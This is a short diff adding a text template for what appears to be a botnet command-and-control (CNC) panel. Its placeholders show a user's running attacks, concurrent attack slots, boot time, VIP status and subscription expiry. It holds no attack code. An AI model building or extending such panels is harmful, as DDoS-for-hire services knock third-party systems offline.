@@ -1,0 +1,13 @@
+user>            <&user.name>
+user uptime>     <&user.uptime>
+user vip>        <&user.vip>
+running attacks> <&user.running>
+boottime>        <&user.boottime>
+concurrents>     <&user.concurrents>
+expiry in>       <&user.until_expiry>
+created by>      <&user.createdby>
+
+            >CNC<
+            
+cnc uptime> <&cnc.uptime> 
+cnc name>   <&cnc.name>
